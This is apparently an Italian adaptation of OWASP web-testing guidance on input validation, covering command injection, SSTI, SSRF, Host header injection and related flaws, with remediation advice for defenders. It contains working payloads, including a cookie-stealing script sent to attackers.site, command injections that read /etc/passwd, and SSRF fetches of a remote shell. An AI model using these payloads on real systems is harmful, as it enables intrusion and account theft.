Questa sezione descrive come un tester può verificare se è possibile inserire codice come input su una pagina web e farlo eseguire dal server web.

**Come testarlo**
**Black box**
*Test per le vulnerabilità PHP*
Utilizzando la query string, il tester può iniettare codice (in questo esempio, un URL malevolo) da elaborare come parte del file incluso:

    http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a
    
L'URL malevolo viene accettato come parametro per la pagina PHP, che in seguito utilizzerà il valore in un file incluso.

**Grey box**
*Test per le vulnerabilità di iniezione di codice ASP*
Esaminare il codice ASP per l'input dell'utente utilizzato nelle funzioni di esecuzione. L'utente può inserire comandi nel campo di input dei dati? Qui, il codice ASP salverà l'input in un file e poi lo eseguirà:

    <%
    If not isEmpty(Request( "Data" ) ) Then
    Dim fso, f
    'User input Data is written to a file named data.txt
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
    f.Write Request("Data") & vbCrLf
    f.close
    Set f = nothing
    Set fso = Nothing

    'Data.txt is executed
    Server.Execute( "data.txt" )

    Else
    %>

    <form>
    <input name="Data" /><input type="submit" name="Enter Data" />

    </form>
    <%
    End If
    %>)))

**Rimedi**
* È fondamentale filtrare e sanificare tutti gli input dell'utente. Utilizzare librerie di sanitizzazione per rimuovere caratteri speciali che potrebbero essere usati per iniezioni.
* Proprio come con SQL, l'uso di dichiarazioni preparate (o parametrizzate) aiuta a separare i dati dall'istruzione. In XPath, questo può essere implementato attraverso l'uso di variabili o binding di parametri.

#### 10 - Test per l'iniezione di comandi di sistema
Questo articolo descrive come testare un'applicazione per l'iniezione di comandi di sistema operativo. Il tester cercherà di iniettare un comando di sistema attraverso una richiesta HTTP all'applicazione.

L'iniezione di comandi di sistema operativo è una tecnica utilizzata tramite un'interfaccia web per eseguire comandi di sistema su un server web. L'utente fornisce comandi del sistema operativo attraverso un'interfaccia web per eseguire tali comandi. Qualsiasi interfaccia web che non è adeguatamente sanitizzata è soggetta a questo tipo di exploit. Con la capacità di eseguire comandi di sistema, l'utente può caricare programmi malevoli o addirittura ottenere password. L'iniezione di comandi di sistema è prevenibile quando la sicurezza è enfatizzata durante la progettazione e lo sviluppo delle applicazioni.

**Come testarlo**
Quando si visualizza un file in un'applicazione web, il nome del file è spesso mostrato nell'URL. Perl consente di inviare dati da un processo a un'istruzione aperta. L'utente può semplicemente aggiungere il simbolo Pipe `|` alla fine del nome del file.

Esempio di URL prima della modifica:

    http://sensitive/cgi-bin/userData.pl?doc=user1.txt

Esempio di URL modificato:

    http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|

Questo eseguirà il comando `/bin/ls`.

Aggiungere un punto e virgola alla fine di un URL per una pagina .PHP seguito da un comando del sistema operativo eseguirà il comando. `%3B` è codificato in URL e si decodifica in punto e virgola.

    http://sensitive/something.php?dir=%3Bcat%20/etc/passwd

*Esempio*
Considera un'applicazione che contiene un set di documenti che può essere cercato da internet. Se avvii un proxy personale come ZAP o BurpSuite, puoi ottenere un POST HTTP come:

    POST /public/doc HTTP/1.1
    Host: www.example.com
    [...]
    Referer: http://127.0.0.1/WebGoat/attack?Screen=20
    Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
    Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
    Content-Type: application/x-www-form-urlencoded
    Content-length: 33

    Doc=Doc1.pdf

In questa richiesta controlliamo come l'applicazione cerca la documentazione. Adesso ccontrolliamo se è possibile aggiungere un comando di sistema nel POST HTTP

    POST /public/doc HTTP/1.1
    Host: www.example.com
    [...]
    Referer: http://127.0.0.1/WebGoat/attack?Screen=20
    Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
    Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
    Content-Type: application/x-www-form-urlencoded
    Content-length: 33

    Doc=Doc1.pdf+|+Dir c:\

Se l'applicazione non valida la richiesta, otteniamo il seguente risultato:

    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
    Output...
    Il volume nell'unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
    18/10/2006 00:27 2,675 Dir_Prog.txt
    18/10/2006 00:28 3,887 Dir_ProgFile.txt
    16/11/2006 10:43
        Doc
        11/11/2006 17:25
        Documents and Settings
        25/10/2006 03:11
            I386
            14/11/2006 18:51
            h4ck3r
            30/09/2005 21:40 25,934
            OWASP1.JPG
            03/11/2006 18:29
                Prog
                18/11/2006 11:20
                    Program Files
                    16/11/2006 21:12
                        Software
                        24/10/2006 18:25
                            Setup
                            24/10/2006 23:37
                                Technologies
                                18/11/2006 11:14
                                3 File 32,496 byte
                                13 Directory 6,921,269,248 byte disponibili
                                Return code: 0


In questo caso, il nostro attacco è andato a segno.

Si può provare questo a questo link: http://www.example.com/public/doc.

**Caratteri speciali perl'iniezioni di comandi di sistema**
I seguenti caratteri speciali possono essere utilizzati per l'iniezione di comandi:
* `cmd1|cmd2`: L'uso di | fa sì che il comando 2 venga eseguito indipendentemente dal successo dell'esecuzione del comando 1.
* `cmd1;cmd2`: L'uso di ; fa sì che il comando 2 venga eseguito indipendentemente dal successo dell'esecuzione del comando 1.
* `cmd1||cmd2`: Il comando 2 verrà eseguito solo se l'esecuzione del comando 1 fallisce.
* `cmd1&&cmd2`: Il comando 2 verrà eseguito solo se l'esecuzione del comando 1 ha successo.
* `$(cmd)`: Ad esempio, `echo $(whoami)` o `$(touch test.sh; echo 'ls' > test.sh)`.
* cmd: Viene utilizzato per eseguire un comando specifico. Ad esempio, `whoami`.
* `>(cmd)`: Esempio: >(ls).
* `<(cmd)`: Esempio: <(ls).

**Code review delle API percolose**
Sappi che l'utilizzo delle seguenti API può introdurre il rischio di iniezione di comandi per sistema operativo:
* Java
    * `Runtime.exec()`
* C/C++
    * `system`
    * `exec`
    * `ShellExecute`
* Python
    * `exec`
    * `eval`
    * `os.system`
    * `os.popen`
    * `subprocess.popen`
    * `subprocess.call`
* PHP
    * `system`
    * `shelòl_exec`
    * `exec`
    * `proc_open`
    * `eval`

**Rimedi**
*Sanitizzazione*
L'URL e i dati del modulo devono essere sanitizzati per caratteri non validi. Una lista di esclusione di caratteri è un'opzione, ma potrebbe essere difficile pensare a tutti i caratteri contro cui validare. Inoltre, potrebbero esserci alcuni caratteri che non sono stati ancora scoperti. Dovrebbe essere creata una lista di inclusione contenente solo i caratteri consentiti o una lista di comandi per convalidare l'input dell'utente. I caratteri che sono stati trascurati, così come le minacce non scoperte, dovrebbero essere eliminati da questa lista.

Una lista generale di esclusione da includere per l'iniezione di comandi può essere | ; & $ > < ' \ ! >> #

Evitare o filtrare caratteri speciali per Windows:` ( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . " % @ / \ : + `
Evitare o filtrare caratteri speciali per Linux: `{ } ( ) > < & * ‘ | = ? ; [ ] $ – # ~ ! . " % / \ : +`

L'applicazione web e i suoi componenti devono essere eseguiti con permessi rigorosi che non consentano l'esecuzione di comandi di sistema operativo. Cerca di verificare tutte queste informazioni per testare da un punto di vista di testing gray-box.

#### 11 - Test per iniezione di stringhe di formato
Il caso peggiore per le vulnerabilità delle stringhe di formato si verifica in linguaggi che non controllano gli argomenti e includono anche uno specificatore %n che scrive in memoria. Queste funzioni, se sfruttate da un attaccante modificando una stringa di formato, potrebbero causare divulgazione di informazioni ed esecuzione di codice:
* C e C++: printf e metodi simili come fprintf, sprintf, snprintf
* Perl: printf e sprintf

Queste funzioni di stringa di formato non possono scrivere in memoria, ma gli attaccanti possono comunque causare divulgazione di informazioni cambiando le stringhe di formato per output di valori che gli sviluppatori non intendevano inviare:
* Python 2.6 e 2.7: str.format e Python 3: unicode str.format possono essere modificate iniettando stringhe che possono puntare ad altre variabili in memoria.

Le seguenti funzioni di stringa di formato possono causare errori a runtime se l'attaccante aggiunge specificatori di conversione:
* Java: String.format e PrintStream.format
* PHP: printf

Esempio in C:

    char *userName = /* input from user controlled field */;

    printf("DEBUG Current user: ");
    // Vulnerable debugging code
    printf(userName);

Esempio in Java:

    final String userName = /* input from user controlled field */;

    System.out.printf("DEBUG Current user: ");
    // Vulnerable code:
    System.out.printf(userName);

**Come testarlo**
*Analisi statica*
Gli strumenti di analisi statica possono trovare vulnerabilità di stringa di formato sia nel codice che nei binari. Esempi di strumenti includono:
* C e C++: [Flawfinder](https://dwheeler.com/flawfinder/)
* Java: FindSecurityBugs regola [FORMAT_STRING_MANIPULATION](https://find-sec-bugs.github.io/bugs.htm#FORMAT_STRING_MANIPULATION)
* PHP: String formatter Analyzer in [phpsa](https://github.com/ovr/phpsa/blob/master/docs/05_Analyzers.md#function_string_formater)

*Ispezione manuale del codice*
L'analisi statica potrebbe perdere casi più sottili, comprese le stringhe di formato generate da codice complesso.

*Iniezione di specificatori di conversione*
I tester possono controllare a livello di test unitario o di sistema completo inviando specificatori di conversione in qualsiasi input di stringa. [Fuzz](https://owasp.org/www-community/Fuzzing), il programma utilizzando tutti gli specificatori di conversione per tutti i linguaggi utilizzati dal sistema in esame. Consulta la pagina sugli [attacchi di stringa di formato di OWASP](https://owasp.org/www-community/attacks/Format_string_attack) per possibili input da utilizzare. Se il test fallisce, il programma si fermerà o visualizzerà un output inaspettato. Se il test riesce, il tentativo di inviare uno specificatore di conversione dovrebbe essere bloccato, oppure la stringa dovrebbe passare attraverso il sistema senza problemi come qualsiasi altro input valido.

*Iniezione manuale*
I tester possono eseguire un test manuale utilizzando un browser web o altri strumenti di debug API web. Navigare verso l'applicazione web o il sito in modo che la query contenga specificatori di conversione. Nota che la maggior parte degli specificatori di conversione ha bisogno di essere codificata se inviata all'interno di un URL perché contengono caratteri speciali tra cui % e {. Il test può introdurre una stringa di specificatori %s%s%s%n navigando con il seguente URL:

    https://vulnerable_host/userinfo?username=%25s%25s%25s%25n
    
Se il sito web è vulnerabile, il browser o lo strumento dovrebbe ricevere un errore, che potrebbe includere un timeout o un codice di ritorno HTTP 500.

*Fuzz assistito da strumenti*
Gli strumenti di fuzzing, inclusi [wfuzz](https://github.com/xmendez/wfuzz), possono automatizzare i test di iniezione.

Per una [spiegazione semplice](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection.md) di come funziona guardare in fondo alla pagina.

**Rimedi**
* È fondamentale filtrare e sanificare tutti gli input dell'utente. Utilizzare librerie di sanitizzazione per rimuovere caratteri speciali che potrebbero essere usati per iniezioni.
* Proprio come con SQL, l'uso di dichiarazioni preparate (o parametrizzate) aiuta a separare i dati dall'istruzione. In XPath, questo può essere implementato attraverso l'uso di variabili o binding di parametri.
* Utilizza funzioni di formattazine sicure

#### 12 - Test per vulnerabilità incubate
Spesso riferiti anche come attacchi persistenti, i test incubati sono un metodo di test complesso che richiede più di una vulnerabilità di validazione dei dati per funzionare.

Le vulnerabilità incubate presentano le seguenti caratteristiche:
* **Persistenza del vettore di attacco**: Perché un attacco possa avere successo, il "vettore di attacco" (ovvero il codice o il payload malevolo) deve essere immagazzinato nel sistema in modo persistente. Questo significa che deve essere salvato in un database o in un file, piuttosto che essere semplicemente inviato come parte di una richiesta temporanea. La persistenza avviene spesso a causa di una debole validazione dei dati. Ad esempio, se un'applicazione consente a un utente di inserire dati senza controlli adeguati, un attaccante può inserire codice malevolo che verrà poi memorizzato. Questo può avvenire anche tramite canali che non sono ben protetti, come una console di amministrazione o un processo batch che elabora dati in background.
* **Esecuzione del vettore di attacco**: Una volta che il vettore di attacco è memorizzato, deve essere "richiamato" ed eseguito in modo efficace. Per esempio, in un attacco XSS (Cross-Site Scripting), il codice malevolo deve essere restituito al client senza alcuna forma di validazione dell'output. Se l'applicazione non filtra o modifica correttamente il contenuto che invia al browser, il codice malevolo può essere eseguito dal browser dell'utente, causando danni.

Questo tipo di attacco asincrono copre un ampio spettro di vettori di attacco, tra cui i seguenti:
* Componenti di caricamento file in un'applicazione web, che consentono all'attaccante di caricare file multimediali corrotti (immagini JPEG che sfruttano CVE-2004-0200, immagini PNG che sfruttano CVE-2004-0597, file eseguibili, pagine del sito con componenti attivi, ecc.).
* Problemi di cross-site scripting nei post di forum pubblici.
* Iniezione SQL/XPATH che consente all'attaccante di caricare contenuti in un database, che verranno poi recuperati come parte del contenuto attivo in una pagina web. 
* Server mal configurati che consentono l'installazione di pacchetti Java o componenti simili del sito.

**Come testarlo**
*Esempio di upload di file*
Verifica il tipo di contenuto consentito per il caricamento nell'applicazione web e l'URL risultante per il file caricato. Carica un file che sfrutterà un componente nel workstation locale dell'utente quando verrà visualizzato o scaricato. Invia alla vittima un'email o un altro tipo di avviso per indurla a visitare la pagina. Il risultato atteso è che l'exploit venga attivato quando l'utente visita la pagina risultante o scarica ed esegue il file dal sito fidato.

*Esempio di Cross Sote Scripting in un forum*
1. Inserire il codice Javascript come valore nel loro campo vulnerabile.
    Per esempio `<script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">')</script>`.
2. Aspetta che un utente visiti il sito e metti un `listener` a segnarti tutte le connessioni che avvengono.
3. Quando qualcuno visiterà quella pagina, a caua del Javascript, tutti i cookie verranno inviati al sito dell'attaccante.
4. Usa i cookie ottenuti per impersonificare l'utente.

*Esempio di iniezione SQL*
La prima cosa da verificare è se il sito di destinazione presenta una vulnerabilità di tipo SQL injection come decritto sopra. 
Per ogni vulnerabilità SQL-injection, esiste un insieme di vincoli che descrivono il tipo di query che l'attaccante/il tester può eseguire.
Il tester deve quindi far coincidere gli attacchi XSS che ha ideato con le voci che gli è consentito inserire.
In modo simile all'esempio XSS precedente, utilizzate un campo della pagina web vulnerabile ai problemi di SQL injection per modificare un valore nel database che verrebbe utilizzato dall'applicazione come input da mostrare sul sito senza un filtro adeguato.
Per esempio, supponiamo che nel database ci sia una tabella `footer` con tutti i footer delle pagine del sito, compreso un campo `notice` con la nota legale che appare in fondo a ogni pagina web. Si potrebbe usare la seguente query per iniettare codice JavaScript nel campo del `notice` nella tabella del `footer` del database.

    SELECT field1, field2, field3
    FROM table_x
    WHERE field2 = 'x';
       UPDATE footer
       SET notice = 'Copyright 1999-2030%20
           <script>document.write(\'<img src="http://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'
       WHERE notice = 'Copyright 1999-2030';

Ora per ogni user che si connetterà al sito, i suoi cookie veranno inviati all'attaccante.

*Server configurato male*
Alcuni server web presentano un'interfaccia di amministrazione che potrebbe consentire a un attaccante di caricare componenti attivi a sua scelta sul sito.
In questo caso, è possibile caricare un file WAR e distribuire una nuova applicazione web sul sito, il che non solo consentirebbe al tester di penetrazione di eseguire codice a sua scelta localmente sul server, ma anche di piantare un'applicazione sul sito fidato, che gli utenti regolari del sito possono poi accedere (probabilmente con un grado di fiducia maggiore rispetto a quando accedono a un sito diverso).

**Grey box**
Le tecnice di grey box o white box sono le stesse discusse in precedenza:
* la convalida dell'input è essenziale e fa controllata su tutte le backdoor che hanno accesso al server
* Per combattere il problema delle backdoor e gli attacchi lato client, è necessario usare anche la convalida dell'output

**Come testarlo**
* È fondamentale filtrare e sanificare tutti gli input dell'utente. Utilizzare librerie di sanitizzazione per rimuovere caratteri speciali che potrebbero essere usati per iniezioni.
* Proprio come con SQL, l'uso di dichiarazioni preparate (o parametrizzate) aiuta a separare i dati dall'istruzione. In XPath, questo può essere implementato attraverso l'uso di variabili o binding di parametri.
* Utilizza funzioni di formattazine sicure
* Utilizzare ORM (Object Relational Mapping)
* Utilizza solo librerie affidabili

#### 13 - Test per HTTP Splitting e Smuggling
Il primo attacco si basa sulla mancanza di sanificazione dell'input.
Il secondo attacco, l'aggressore sfrutta il fatto che alcuni messaggi HTTP appositamente creati possono essere analizzati e interpretati in modi diversi a seconda dell'agente che li riceve. Questo necessita di conoscenze ad un livello di grey box.

**Come testarlo**
**HTTP splitting**
Alcune applicazioni web utilizzano parte dell'input dell'utente per generare i valori di alcuni header delle loro risposte. L'esempio più semplice è fornito dalle redirezioni in cui l'URL di destinazione dipende da un valore inviato dall'utente.
Quando il browser riceve questo messaggio, porterà l'utente alla pagina indicata nell'header Location. 

Se l'applicazione non filtra l'input dell'utente, sarà possibile inserire nel parametro 'interface' la sequenza %0d%0a, che rappresenta la sequenza CRLF utilizzata per separare le diverse righe. A questo punto, i tester saranno in grado di attivare una risposta che sarà interpretata come due risposte diverse da chiunque la analizzi.
Questo può essere sfruttato da un attaccante per avvelenare questa web cache, in modo che fornisca contenuti falsi in tutte le richieste successive.

La web cache vedrà due risposte diverse, quindi se l'attaccante invia, immediatamente dopo la prima richiesta, una seconda richiesta per /index.html, la web cache assocerà questa richiesta alla seconda risposta e memorizzerà il suo contenuto. In questo modo, tutte le richieste successive dirette a victim.com/index.html che passano attraverso quella web cache riceveranno il messaggio "sistema inattivo". In questo modo, un attaccante potrebbe effettivamente defacciare il sito per tutti gli utenti che utilizzano quella web cache (l'intero Internet, se la web cache è un reverse proxy per l'applicazione web).

Questo tipo di attacco è altamente improbabile perché devono andare storte molteplici cose in un programma:
* Il pen-tester deve impostare correttamente gli header nella risposta falsa affinché venga memorizzata con successo.
* L'applicazione, pur non filtrando la sequenza CR+LF, potrebbe filtrare altri caratteri necessari per un attacco riuscito (ad esempio, < e >). In questo caso, il tester può provare a utilizzare altre codifiche (ad esempio, UTF-7).
* Alcuni target (ad esempio, ASP) codificheranno l'URL nella parte del path dell'header Location (ad esempio, www.victim.com/redirect.asp), rendendo inutile la sequenza CRLF. 

**Grey box**
**HTTP splitting**
Un'esploitazione riuscita dell'HTTP Splitting è notevolmente facilitata dalla conoscenza di alcuni dettagli dell'applicazione web e dell'obiettivo dell'attacco.

**HTTP smuggling**
L'HTTP Smuggling sfrutta i modi differenti in cui un messaggio HTTP appositamente strutturato può essere analizzato e interpretato da diversi agenti (browser, cache web, firewall applicativi). 
Ci sono diverse possibili applicazioni e analizzeremo una delle più spettacolari: il bypass di un firewall applicativo. 

*C'è un esempio specifico di [bypass di un firewall applicativo](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md) e alcune [whitepapers](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md) che parlano di questa cosa*.

**Come testarlo**
* È fondamentale filtrare e sanificare tutti gli input dell'utente. Utilizzare librerie di sanitizzazione per rimuovere caratteri speciali che potrebbero essere usati per iniezioni.
* Proprio come con SQL, l'uso di dichiarazioni preparate (o parametrizzate) aiuta a separare i dati dall'istruzione. In XPath, questo può essere implementato attraverso l'uso di variabili o binding di parametri.
* Utilizza funzioni di formattazine sicure
* Utilizzare ORM (Object Relational Mapping)
* Utilizza solo librerie affidabili

#### 14 - Testare le richieste HTTP in entrata
Questa sezione descrive come monitorare tutte le richieste HTTP in entrata e in uscita sia dal lato client che dal lato server. L'obiettivo di questo test è verificare se ci sono richieste HTTP sospette o non necessarie inviate in background.

Le tecniche di testing elencate di seguito sono principalmente focalizzate su come possiamo monitorare le richieste HTTP senza modifiche al lato client, il che si avvicina maggiormente a uno scenario di utilizzo in produzione.

**Come testarlo**
*Proxy inverso*
Ci sono situazioni in cui vogliamo monitorare tutte le richieste HTTP in entrata sul web server, ma non possiamo modificare la configurazione nel browser o nell'applicazione client. In questo scenario, possiamo configurare un proxy inverso sul server web per monitorare tutte le richieste in entrata e in uscita.

Per la piattaforma Windows, si consiglia Fiddler. Non solo fornisce monitoraggio, ma può anche modificare/ripetere le richieste HTTP. Fare riferimento a questa guida per configurare Fiddler come proxy inverso.

Per la piattaforma Linux, può essere utilizzato Charles Web Debugging Proxy.

Passaggi per il test:
* Installa Fiddler o Charles
* Configurali come proxy inversi
* Cattura il traffico HTTP
* Ispeziona il traffico HTTP
* Modifica le richieste HTTP e ripeti le richieste modificate per il test

*Port Forwarding*
Il port forwarding è un altro modo per intercettare le richieste HTTP senza modifiche al lato client. Puoi anche utilizzare Charles come proxy SOCKS per fungere da port forwarding o utilizzare strumenti di port forwarding. Questo ci permetterà di inoltrare tutto il traffico catturato dal lato client al port del server web.

Passaggi per il test:
* Installa Charles o uno strumento che preferisci di port forwarding
* Configuralo come proxy SOCKS per il port forwarding

*Cattura del traffico di rete a livello TCP*
Questa tecnica monitora tutto il traffico di rete a livello TCP. Possono essere utilizzati strumenti come TCPDump o WireShark. Tuttavia, questi strumenti non consentono di modificare il traffico catturato e inviare richieste HTTP modificate per il test. Per riprodurre i pacchetti di traffico catturati (PCAP), può essere utilizzato Ostinato.

Passaggi per il test:
* Attivare TCPDump o WireShark sul Web Server per catturare il traffico di rete.
* Monitorare i file catturati (PCAP).
* Modificare i file PCAP utilizzando Ostinato in base alle necessità.
* Ripetere le richieste HTTP.

Si raccomandano Fiddler o Charles poiché questi strumenti possono catturare il traffico HTTP e anche facilmente modificare/ripetere le richieste HTTP modificate.

#### 15 - Test per l'iniezione dell'intestazione Host
Un server web ospita comunemente diverse applicazioni web sullo stesso indirizzo IP, riferendosi a ciascuna applicazione tramite l'host virtuale. In una richiesta HTTP in arrivo, i server web spesso indirizzano la richiesta all'host virtuale target in base al valore fornito nell'intestazione Host. Senza una corretta validazione del valore dell'intestazione, un attaccante può fornire input non valido.

**Come testarlo**
Il test iniziale è semplice: basta inserire un altro dominio (ad esempio, attacker.com) nel campo dell'intestazione Host. È il modo in cui il server web elabora il valore dell'intestazione a determinare l'impatto.

    GET / HTTP/1.1
    Host: www.attacker.com
    [...]

Nel caso più semplice, questo potrebbe causare un reindirizzamento 302 verso il dominio fornito.

    HTTP/1.1 302 Found
    [...]
    Location: http://www.attacker.com/login.php

In alternativa, il server web potrebbe inviare la richiesta al primo host virtuale nella lista.

*X-Forwarded Host Header Bypass*
Nel caso in cui l'iniezione dell'intestazione Host sia mitigata controllando l'input non valido, è possibile fornire il valore all'intestazione X-Forwarded-Host.

    GET / HTTP/1.1
    Host: www.example.com
    X-Forwarded-Host: www.attacker.com
    [...]

Questo potrebbe generare output sul lato client come:

    <link src="http://www.attacker.com/link" />

Anche in questo caso, tutto dipende da come il server web elabora il valore dell'intestazione.

*Avvelenamento della Cache Web*
Utilizzando questa tecnica, un attaccante può manipolare una cache web per servire contenuti avvelenati a chiunque ne faccia richiesta. Questo si basa sulla capacità di avvelenare il proxy di caching gestito dall'applicazione stessa, dai CDN o da altri fornitori downstream. Di conseguenza, la vittima non avrà alcun controllo nel ricevere contenuti dannosi quando richiede l'applicazione vulnerabile.
Quando una vittima visita l'applicazione vulnerabile, dal cache web verrà servito quanto segue:

    <link src="http://www.attacker.com/link" />

*Avvelenamento della reimpostazione della password*
È comune che la funzionalità di reimpostazione della password includa il valore dell'intestazione Host quando crea i link di reimpostazione della password utilizzando un token segreto generato. Se l'applicazione elabora un dominio controllato dall'attaccante per creare un link di reimpostazione della password, la vittima potrebbe cliccare sul link nell'email, consentendo all'attaccante di ottenere il token di reimpostazione e, quindi, di reimpostare la password della vittima.

Facendo una richiesta HTTP alla pagina di reimpostazione della password con un'intestazione Host manomessa, possiamo modificare a dove punta l'URL.

Il dominio specificato (www.attacker.com) verrà quindi utilizzato nel link di reimpostazione, che verrà inviato via email all'utente. Quando l'utente clicca su questo link, l'attaccante può rubare il token e compromettere il suo account.

**Rimedi**
* Validazione dell'intestazione Host. Consentire solo gli host attesi e noti, rifiutando tutte le richieste che contengono un valore non valido.
* Configurare correttamente il server web per limitare l'elaborazione delle richieste agli host definiti nella configurazione del server stesso, disabilitando eventuali host virtuali non utilizzati.
* Non fidarsi mai delle intestazioni come `X-Forwarded-Host`, `X-Real-IP`, o simili senza una validazione appropriata, poiché possono essere facilmente manipolate da un attaccante. Se necessario utilizzare queste intestazioni, validarle in modo simile all'intestazione Host.
* Implementare correttamente le intestazioni di controllo della cache (ad esempio, Cache-Control, Pragma) per evitare che contenuti sensibili o potenzialmente malevoli vengano memorizzati e serviti da un proxy o CDN.
* Generare i link di reimpostazione della password utilizzando l’URL corretto del dominio dell'applicazione, invece di fare affidamento sull'intestazione Host. Includere l'URL di reimpostazione direttamente nel server, evitando di costruirlo basandosi su input dell'utente.

#### 16 - Test per l'iniezione di Template lato server
Le vulnerabilità di Server-side Template Injection (SSTI) si verificano quando l'input dell'utente viene incorporato in un template in modo non sicuro, portando all'esecuzione di codice remoto sul server. 
Qualsiasi funzionalità che supporta markup avanzato fornito dall'utente può essere vulnerabile a SSTI.

*Esempio con Flask/Jinja2*
Nell'esempio la funzione `page` accetta un parametro 'name' da un GET HTTP e rende una risposta HTTP col contenuto della variabile 'name':

    @app.route("/page")
    def page():
        name = request.values.get('name')
        output = Jinja2.from_string('Hello ' + name + '!').render()
        return output

Questo è vulnerabile a XSS e SSTI mettendo all'intrno della variabile 'name':

    $ curl -g 'http://www.target.com/page?name={{7*7}}'
    Hello 49!

**Come testarlo**
*Identificare la vulnerabilità*
Il primo passo per testare le SSTI nel contesto di testo in chiaro è costruire espressioni template comuni utilizzate da vari motori di template come payload e monitorare le risposte del server per identificare quale espressione template è stata eseguita.

    a{{bar}}b
    a{{7*7}}
    {var} ${var} {{var}} <%var%> [% var %]

In questo passo, è consigliabile avere un [elenco esteso di stringhe/payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) di espressioni template da testare.

l testing per SSTI nel contesto di codice è leggermente diverso. Prima, il tester costruisce una richiesta che restituisce risposte del server vuote o errori. Nell'esempio seguente, il parametro HTTP GET viene inserito nella variabile personal_greeting in un'istruzione del template:

    personal_greeting=username
    Hello user01

Utilizzando il seguente payload, la risposta del server è vuota:

    personal_greeting=username<tag>
    Hello

Nella fase successiva, si cerca di uscire dall'istruzione del template e iniettare un tag HTML dopo di essa, utilizzando il seguente payload:

    personal_greeting=username}}<tag>
    Hello user01 <tag>

In questo modo, si verifica se il server interpreta l'input come parte del template, consentendo l'iniezione di codice HTML e rivelando una vulnerabilità SSTI.

*Identificare il motore di templating*
Basandosi sulle informazioni del passo precedente, ora il tester deve identificare quale motore di templating viene utilizzato, fornendo varie espressioni template. Analizzando le risposte del server, il tester può dedurre il motore di templating impiegato.
Questo passaggio si può automatizzare con [Tplmap](https://github.com/epinna/tplmap) o con [Backslash Powered Scanner Burp Suite extension](https://github.com/PortSwigger/backslash-powered-scanner).

**Rimedio**
* Sanitizza l'input

#### 17 - Test per la falsificazione delle richieste lato server
Un attacco SSRF riuscito può consentire all'attaccante di accedere a azioni riservate, servizi interni o file interni all'interno dell'applicazione o dell'organizzazione. In alcuni casi, può persino portare a Remote Code Execution (RCE).

**Come testarlo**
Quando si testa per SSRF, si tenta di far sì che il server mirato carichi o salvi involontariamente contenuti che potrebbero essere malevoli. 

Si consideri questa richiesta

    GET https://example.com/page?page=about.php

Puoi testare questa richiesta con i seguenti payload.

*Caricare il contenuto di un file*

    GET https://example.com/page?page=https://malicioussite.com/shell.php

*Accedere ad una pagina riservata*

    GET https://example.com/page?page=http://localhost/admin

    GET https://example.com/page?page=http://127.0.0.1/admin


Questo tipo di relazioni di fiducia, dove le richieste originate dalla macchina locale vengono gestite in modo diverso rispetto alle normali richieste, è spesso ciò che consente all'SSRF di essere una vulnerabilità critica.

*Recupera un file locale*

    GET https://example.com/page?page=file:///etc/passwd

*Generatori di PDF*
In alcuni casi, un server potrebbe convertire file caricati in formato PDF. Prova a iniettare elementi `<iframe>`, `<img>`, `<base>` o `<script>`, oppure funzioni CSS `url()` che puntano a servizi interni.

    <iframe src="file:///etc/passwd" width="400" height="400">
    <iframe src="file:///c:/windows/win.ini" width="400" height="400">

*Bypass di filtri comuni*
Alcune applicazioni bloccano i riferimenti a `localhost` e `127.0.0.1`. 
Questo può essere aggirato:
* Utilizzando rappresentazioni alternative dell'IP che valutano a `127.0.0.1`:
    * Notazione decimale: `2130706433`
    * Notazione ottale: `017700000001`
    * Accorciamento dell'IP: `127.1`
* Offuscamento delle stringhe
* Registrando il proprio dominio che risolve a `127.0.0.1`

A volte l'applicazione consente input che corrispondono a una certa espressione, come un dominio. Questo può essere aggirato se il parser dello schema URL non è implementato correttamente, risultando in attacchi simili agli attacchi semantici.
* Utilizzando il carattere `@` per separare tra le informazioni utente e l'host: `https://expected-domain@attacker-domain`
* Frammentazione dell'URL con il carattere `#`: `https://attacker-domain#expected-domain`
* Codifica dell'URL
* Fuzzing
* Combinazioni di tutto quanto sopra

**Rimedi**
* Limita gli URL o i percorsi che l'applicazione può accettare. Utilizza whitelist per consentire solo richieste a servizi interni specifici. Assicurati che gli input seguano un formato atteso e specifico (ad esempio, URL validi) e scarta input sospetti.
* Implementa controlli per rifiutare richieste verso localhost, 127.0.0.1 e altre interfacce di rete interne. Limita le richieste a intervalli di indirizzi IP noti e considerati sicuri, come quelli delle reti private (RFC 1918).
* Se non necessario, disabilita le funzionalità che permettono al server di caricare contenuti da URL esterni. Configura un firewall per bloccare richieste sospette o non autorizzate a servizi interni.

L'SSRF è noto per essere uno degli attacchi più difficili da sconfiggere senza l'uso di liste di autorizzazione che richiedono specifici IP e URL. Per ulteriori informazioni sulla prevenzione dell'SSRF, leggi la `Server Side Request Forgery Prevention Cheatsheet`.

#### 18 - Test per assegnamenti di massa
Le moderne applicazioni web sono spesso basate su framework. Molti di questi framework per applicazioni web consentono l'associazione automatica dell'input dell'utente (sotto forma di parametri di richiesta HTTP) a oggetti interni.
Questa caratteristica può essere sfruttata per accedere a campi che non dovrebbero mai essere modificati dall'esterno, portando a un'elevazione dei privilegi, manomissione dei dati, bypass di meccanismi di sicurezza e altro ancora.

* Le proprietà relative ai permessi dovrebbero essere accessibili solo a ruoli privilegiati
* Le proprietà dipendenti da processi dovrebbero essere impostate solo internamente al completamento di un processo
